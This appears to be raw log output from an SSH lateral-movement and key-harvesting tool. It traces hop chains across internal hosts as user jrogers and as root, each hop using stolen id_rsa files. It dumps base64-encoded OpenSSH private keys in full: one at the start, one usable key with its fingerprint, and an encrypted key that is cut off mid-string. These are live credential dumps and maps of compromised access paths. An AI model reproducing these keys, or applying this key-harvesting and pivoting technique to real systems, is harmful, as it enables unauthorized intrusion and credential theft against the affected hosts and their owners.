HBlSCtlSjVjM2dRQUEKQU1FQTBJTnFFZEhBWGNxNGhEa25mSGVPcVFYb1ZrMmFsS1VJcHRHVlplNnphSW92dHBDU1IzZUltVy9Icm9YZDFJQVZ5Vgpqck52NzlIdWl0R013NmNxODJVY1M5NmRUU3hEVFQ1QXc2TXVvVzVaQUswLzFWenM2TlFJZ0dselZPNU9ib0RXZEVhV1FrCitTdXEvOHZpMEQzakV0RGF1Q1ZjUUh5dTVaTGtMRTQxTk5oY05PN0hndjc3a2Z3TnZpdkN3ZHpMNGFLeldCMDBNVWp0N28KUjY0UnFvVFhWUmxXUHFUOWFVZ2lwNzVmWXNMSVFFVmtFc1kySjUydkdwejd1ZmFMakRBQUFBd1FEMU9Cemt2NGhEQmdscwpXeHVwQWk5NTMxOU14bXgzWk9tbm1aMWxrKzFQNlIyU0orUEt0QlBXL0FNTjFTWk5XVjlaNWQxcXVHMXVYc3U4N0RvenB3CkZzU2hvdXY5eXo1VXkwWlJkUVRZYTlXYXRkT3lld0s1L3RuSzhKTDVjNklEUVA0SDQzR1U1cmxFMzlnYmwxK2U3LzBtT3MKWVJ6djcvZVhhakJUcS92MFVtRDZCczUvckRtK3cwUGpVWkJHTG1DRVBSVUFYTTdSUld2Rm53MWxzRjNnMDJoaXJQVlgxbApudkxKcVMxQW1xaFRyRHNNbmY3Snlqa0k0MzI0Y2xJV3NBQUFEQkFNKzFWMWs1MktzN2hHdzVBSWNjVThIdFg3d3poaFpICjh2bnhCUmJNYmNZMjFHS21jWlN6N0pzUGNuekFVVlZhbkZKK1VjUUl6OFNWbGRMdHU5dzQySUdxY2JJSDl1NG1NMnI0STkKQ0JNTlZKMk1mMUF1N2ZYbkRka2E4bWJDclBxZUY5T05tVGFlcVg4VllVVW9VTU1rbEdyRGp3bHdQajlGZ21NeGY5WG5kcQpHdEtCbFZFVlAxUmNsd25LUWlyMnNmV0pWQkNRL3NhWVJBcnVrWDUvY2dLWmNTNXBrSWRGc0wxU1gwWXZyd00rRTdUSGlPClkxSnI1U3NhWDcvMkg5cVFBQUFBOXliMjkwUUdsdWMzUmhibU5sTFRZQkFnPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020303]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28: EXTERNAL_MSG: INFO: Beginning with 12 dests and 2 keys\n[1704020304]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.25\n[1704020304]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.25)\n[1704020304]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.27\n[1704020304]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.27)\n[1704020305]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26\n[1704020305]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)\n[1704020305]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29\n[1704020305]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020305]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.29\n[1704020305]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020306]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.28\n[1704020306]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020306]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/root/.ssh/id_rsa]->root@127.0.0.1\n[1704020306]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020306]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020306]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020307]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020307]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020307]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020307]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020307]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020307]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020308]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020308]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020308]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020308]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020309]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020309]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020309]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020309]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020309]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020309]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020310]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020310]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020310]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020310]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020310]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020310]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020311] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020311] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020311] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020311] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020311] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020311] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020311] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020311] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n\n\n---------------------------------------\n\nuse_retry_all_dests=1. Re-starting.\n12 destinations (from 10 unique servers) added to interesting_dests.\n\n---------------------------------------\n\n\n[1704020312]jrogers@10.128.0.25\n[1704020312]jrogers@(10.128.0.25)\n[1704020312]jrogers@10.128.0.25: Discovered usable private key [3072 MD5:b2:45:a5:03:54:c7:71:29:c1:0d:f5:c5:e8:27:63:5f jrogers@instance-3 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020313]jrogers@10.128.0.25: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUFua1JURStqRURCZU5sM25WRVIyTk9udUU4ZUIzSHdxeDhCMWphamdDZmk3NERIZlYvc3hZCnlkNjBybTRYbHFzWk8weFM3YW5vVTM5RmFhZ1llL2R6RG1ZWDY3Y0V0V0hsVUJQVGh0OEhYUjFUMlBYaGZLZTBsUHA3Sk8KS0ZFTjFqMmRYaEhsd0g2dlhMc1RwS3lUdzBYR2FoRmhoNHl1VWlkTi9RRlQ2aDgwRlArZ1c0N1J4U1hGTUlQRE9McWJrSwpVNU0zRER4ZUlaaDgzT0UzcDlRSHBzS2VIamZaNWYzaDBtbFFLY05vOGE3eHI1OVRCcGFhMkwxc05KbXZNTzNVb3QzeG9VCnRnU0dLNldValNOQjcxeldNN1lyUFIwd3JzSHBObGpFUkdIV05DR1lTU0NtVUdNclhOUjk2N1VKYjZ3Yk9KUitEUk1vUzcKUEY2VHdXek5VY2lIcXN3a1FMZUFGM1FObWFKWXBHUXFLbkVoN0ZMRkExdklEWjVSeWhoTnZGSkVoMUt2bWxQMzVJS3l6ZgppTkdXRjZHTCsrYVVtUlJpY2xuU3AyMTcxaTB5djJicm92L0tOMmlXYXEvQStOZjBGaFlYZDJ4RzlCK1RFbHFOT0xyRnRtClc3ZVkySFFtWlBPb3VRQlJ4Zms0Nm96QzczMTJJOHhjQUFFdnpFMnZBQUFGaUd3cTRxTnNLdUtqQUFBQUIzTnphQzF5YzIKRUFBQUdCQUo1RVV4UG94QXdYalpkNTFSRWRqVHA3aFBIZ2R4OEtzZkFkWTJvNEFuNHUrQXgzMWY3TVdNbmV0SzV1RjVhcgpHVHRNVXUycDZGTi9SV21vR0h2M2N3NW1GK3UzQkxWaDVWQVQwNGJmQjEwZFU5ajE0WHludEpUNmV5VGloUkRkWTluVjRSCjVjQityMXk3RTZTc2s4TkZ4bW9SWVllTXJsSW5UZjBCVStvZk5CVC9vRnVPMGNVbHhUQ0R3emk2bTVDbE9UTnd3OFhpR1kKZk56aE42ZlVCNmJDbmg0MzJlWDk0ZEpwVUNuRGFQR3U4YStmVXdhV210aTliRFNacnpEdDFLTGQ4YUZMWUVoaXVsbEkwagpRZTljMWpPMkt6MGRNSzdCNlRaWXhFUmgxalFobUVrZ3BsQmpLMXpVZmV1MUNXK3NHemlVZmcwVEtFdXp4ZWs4RnN6VkhJCmg2ck1KRUMzZ0JkMERabWlXS1JrS2lweElleFN4UU5ieUEyZVVjb1lUYnhTUklkU3I1cFQ5K1NDc3MzNGpSbGhlaGkvdm0KbEprVVluSlowcWR0ZTlZdE1yOW02NkwveWpkb2xtcXZ3UGpYOUJZV0YzZHNSdlFma3hKYWpUaTZ4YlpsdTNtTmgwSm1UegpxTGtBVWNYNU9PcU13dTk5ZGlQTVhBQUJMOHhOcndBQUFBTUJBQUVBQUFHQWRTRHZzdzVTK1BmOWJCdFlXb0JhWXV2REtoCmNMVWNmaWhHZmJpV0xHUllpUlB2ajVRTWNPOXVlQkpJNkptcElwN0Q3Q0tPM1Q2T2VLQVhYTUdRSzYvZThFeVFmN3poa1QKVXI0NWo5bERZK0F1aTZUOUtmb2JwUjN6UVFyN204MmM5anhaak5SamI3cFU4MmJHcmtPR0pOUTNaMWpaSEorVGJwZXRNZQp2V2cyYlV2NTY0aTVLb1NYZVI0cXZyTXNLbEo5RU5ybHFHOTZvWXpvZEhYMGVHR2g1eVVyN1czbVdVV05wajMyU2xLQ2htCjZhaXFFM2dtUlQxNjlUcS84eUF2VWdUcDRGUjFZU09WY1V1RHVHSjF5aWc4cUFmUVdIMnN6THhRa1R4dkhXTjlOTU9zczkKKzloSmJjZjRDN0p3VXRaQTUwQVBXdnpWZnVyakh0VEVBQ1ZNOE83MDZ3NFlkY2pSNzVhbk5tamlINXRhSWhKU0w5YStBYwoxOXBJUmJEUzRCRldHS2wwSk1LU3NwdjF3eXVmZDZ4cGhlZE12cnNieE1OeFVBdU9vTzBXRXVXRDFDT29QbEx0M09IUGVFClpwWTRnUFpwQkFwakR4QmZ6cS9QdWtGOC84QWt5eXdSY1pEUU4yVGtWdjdkWmlKS2s2Y1EwWjA5YVoxSEpONGlVUkFBQUEKd0hOdEx5eUU0aEJUZk5ZS2EyNldyay92cWQ1UlZiMktvZm9wT2lrV1R5Y25vOUp0L1llN0FRWGc4Yks3UzBNeVpCbzdkSApVMnRDL1B5Tzl5NjQyMEZoYVg0NURLZnlYckRBNk44UU1WVmtHd25zaWFDUERKUkhVUUwvVTRjZ1pUOVB2SUI5enVNMUM4CkVObzhYMmhBalVYa1ljWmdTYUM4Y2F1TjhWSk4wMFVBa0xxbHE3TTdKYmhHS2phUm54ejN2R0Z2S2RnZ3hPdHpqNTVpeWcKRGJmOGF1TGI4Q2w4TWZVNGdWRkxjZ2lOaER0UXFrRWxnd29GeXVwKzhJckdLU1hBQUFBTUVBenVSUlY3RURiS0VaWGhsQQpGQ3g4Q1oxWjlWS1pBU3BVS3VrUzNVb3Y0enhrTENaWjR4RzUvZUtjeVAvdUkzMVgrclJsMFRncUlkMjZzOG1KSHFTTE9WCkNiSzBFcG9XY0lUamttK0szZHVwWXJvVUNKeExWeHdMdVR6U09DbUtoWDNTV0JQK2lMR1hsV0hzekdyeG9wSWQ5SkcrbWMKWm9TWVAzYVJXTDlWUG9uSFc2WjhoL0VjSkxmVEVxM21OeUZTdU5CakdudXl6dVpyeHJqUER1ZGhvckEyRExFNVpMZHJ1VApuaVBjREtFWFBlL25lcnh1bUtlWTFxSmdkVm5RVmJBQUFBd1FERDFWV1FUcHpNd3VuamdNa01zUXdIY3ZUeHcyOTZnM2hOClRhSFF6ZkJNcDExODREWkc2RXJDSm5aS3JIU0dwYThFSGtURmlXOEc1bGJzNG5iQWtLMG5KUmNVaStyaHU2cVhQNml3Qm0KandQYjVsNldDdmVSVW5OckRBcmZ4SGNQM3hUelVBYW1HUitQYURBejY2V3U0UlR3ZUZYZW9vVHV0ZDg3ZDBPU1RPRkZXWQpWUnFCb0tKcW5Weml0Qm5VeVdhS3IyMjgweXVUdTUzU1lHOEtIeXFab25oZFFFSURCS2lwUmgvYzNRSGwwOXU2SWlueWVyCmZXNENGT2tiazV4VDBBQUFBU2FuSnZaMlZ5YzBCcGJuTjBZVzVqWlMwekFRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020313]jrogers@10.128.0.25: Discovered unusable private key in [/home/jrogers/.ssh/protected]\n[1704020313]jrogers@10.128.0.25: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/protected]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQ21GbGN6STFOaTFqZEhJQUFBQUdZbU55ZVhCMEFBQUFHQUFBQUJEdUlHSGd4RAp5MEh0WW9QUmUwK1VBUEFBQUFFQUFBQUFFQUFBR1hBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEQXIvWWZCRWpnCmE0QnMycnJWWUhSVk1ramxEcHU0T2hDMEJBcWVRYlZYd0l0czNRb09vSkZmMGErSFNDRG5DR0FUblY1SHpkYUR0eENRbVIKMmdzdlczY29CT0tZbThBMTJkLzFxSGZFUG0rNkxoaTFjek44clp0QlV5WDRCLzRqQmFsMWJzLzczSnFRQmZYMmZEbHBJRQpJUmJGbUtqWnNqN1FIOEppRnBlYzIrbmJ2bG1SSWVPeHlPd3ZvUlJzeGcvUU1tdGR0VUp3ZHJNL2pQVVBVQlRBdllrWTFiCk9yVXJYaHdZbDJJVVFmUjY4bTU0VnU5MWpPUHY0VStjWkFJR1FEaWNQYjlodUFEeUxxR2dnQVp6eVJNak1pUkp5RFlnM3AKT3ZyNThBa3p0SHdwSUJiTEhhSzVrZ04xN0RwbFZsc2t0NEpXVFFLanZqWVJJWmp1VzUyTFJJT0JqMjAxZk1LVmhENzdwYgpoekZNbDZkdHY0cE5qU2gxYUhoMGtRRy9ldTcxeUxpLzduWTZuU2prNFd0MWNONHRKQWJ0ZnRCdmJTai80Y2RabFl5cis4CitDWW1TQTJhSlVITTFxRTlvRTV1VGhZa1RnMW91ais0NWRYcUhsU2gvaWFwT0h3Rk45WWY1RnY2ZFpSc0p1UzJmcEo5UjIKVlNlQkJVdC9LSm1SRUFBQVdROGlEUGlWbWRtUW9oSjVELzF4VWlwOG1qeUt5ZXc3eEdMODdqdG9yaEgxcGJCQlc3OHBJLwpxVWNrMFJjNmN4MmZuM0dGSmFtcVJKWTcza3h6a29jVTNVRFV4MWIvc0NJTUZLcGpVSTA5WVFueWRZdjZtN21nWk5nV0FFCktSN283eW5kTVErbnZmNk1WQWtKQ2Rha0daOC8rSTI0ck9xaHUzdHpOQzFZVG5xSTZteW9zRXJ2QUw4WEZQVmpEZld3Uy8Kd2NQeXp0b0lsV1lXWUc0cUh6NXBmM3ZobnI3bE9SWHR5WW93Z2pvc09sWFYvb0xaWWUwQXJzRHJvOW1OaFZGRlQwSTR5SQpDRTE5VmtKekJhZXpkMU9RRTdIcHQwcjhPdkZQWkJDalBsMTFKbzVQcHpmbjlnenZTMTd5M0RURWZvcXpFT25yaHVYWEF4CjJURjdWUGptSGdWQldIaDgyb3Z0c1o3YjZYZTVEV0ozSXBHSEtTNFUxSlc5dTZiRVFRRHEwbmJyVU9mMTIyTWFYYmt4TlkKL3JDZGlkTzBESElWejZvOWgyNkVQMlJrTlpwTlI4MFROT2RjYWFYV25XdytyWkl3eTZMelByeEdkbVpWUVZibW9oVXh0MQp3MEJjWW53dlVYcXN2aFpCaWxMUCs2cFFLKy9lMkVTdE80K255ZU91dFhBK01JMnRsRXVnYVZEU0x4UGpxWU9yZEpQaEJvCm5BNGlxbFltVDlTY2V6REp2VFhkaEJwZXltMmFtM0VXRTVPVjlRdElpNEZHOWEzU2lUdCs4K084TDl3enpUZjlyTVZjeGwKVGtZYzFjU0cwdEVId3RmOUFSZVBDZWVmK0dVcW92SldYMWMzZEpvWGl4aG9XRW1aUmVEZzlHOGF1WnlNd1RuZzNlR25LWAorV0w3cjRuNmtUTkVKTEdYS0hSdXgxa0tuRWx0MWN4bDNaSXROZ1RwTDd1YStMbXFHcThhby9SYzB4SHRjYXJId1VtczBPCmUxenU0YzRyK1RwemhuTmpqRzBZY0p3ek9mR21xcnc2dTdIVm5SSE9HbXVSNm5XcER3VnVCZVNtb1pmamViN1Vnb2pRbkIKSE9RSGNmQkk3d0NicmYyUVN4Nkxra2tyVVUyWXp5WGM2dGdEemhMWFZyNHVMaWxucHJnUjdwcXJSWTdvd1pmQ2Q4endlbApzWnFVVmdrTklSelArY2xZb1JMQjIwUG5sWEU4cTdVcHUrdnI2QUk2Tk5BZmJVNTNWZnkvZkovN0svSk9CK1dsanhnV3IxCjJEZ1ZVSTU4OUFCN2RkbUJveEl2aGM3YVkwMU9ielRvNTJ6RERRTkJkdXlPR2ZzZzFnQzFTZW9YbU4weDFuK3Fza1pFQWcKbVBodVEydFU2R1pWUDgzT1lJYnpyUE0yWFNrdXY3QmdJSmxvdSsyTHlaYjdLcWR0Mms1R3VLalhIOHVkUDVIN2VGUmdHUwpqN0lLVzJoL0xFUXYvOUovYmxhNTB5TXlaWnNvVVh4dlREbDhxMGdTN3AzeWZrRnpkUFZHTENSNmhlMUJQQitVSE1wUHlLClF4YnA3bzdhWGhlRm5CQy9URTdUYzgydytJNnlXZnRKUHVxazNQUFlrWEdHaTNLamE0UC9GdWxHZXpoVTUvb0pGajNVVFoKUDNBZzhHWmZ5cEpxZjFCSkhCbzBzUzBJcXN4U0srcjY3M01BTllBckpzZVVIc1IyTVhuNGlwdTQwaVJpWmFMcG5ZRHV1MwpmUzZsSEl2RVNVditjRG9oQm41MGNmalI4a3h6YlUxQ1Y2NUpmSHdUZk1jaGFHMDJ3R3p5cmJPbzNXN05kbkJSNDVtK3BVCi8yZWFYdXZkNk5Ma241SlFENmo0L2FvM1lEZ1RNaURrdlpZZU9WeEpxVjMyMjBWcUV2ZXFsMnpkSnFQSnFLTzVLU1pKSEgKaXFTcEVPSjFZa3VObExENXpaaXk1WEJ0eEJTWGU0RmRZYzlFNFlyTUhHbWNlMWcrallSelFqeWRVUUVlZjNybzF5ZzFzeQpZZ3puemlMMEtrUGtrL3pySGlEaWNhaHgwdU95NWlsaFhXQzYwcG9OZ0EyNzZqcldxNVB4MHhXTng2VFFNM2IvZHIzWGt3Ckh0S2poYW5sb2xiUWN3SGQ3VDUzRWdmZUUvU2NWbE9ZcEgyUmhlaGt6QTkwUnNiNVFFdjh6Q1AvQnhPWTludnlpK1V5cjEKa0d6QVdMOHVZdlpha3hJazkzTTlCU2tvL3VvVk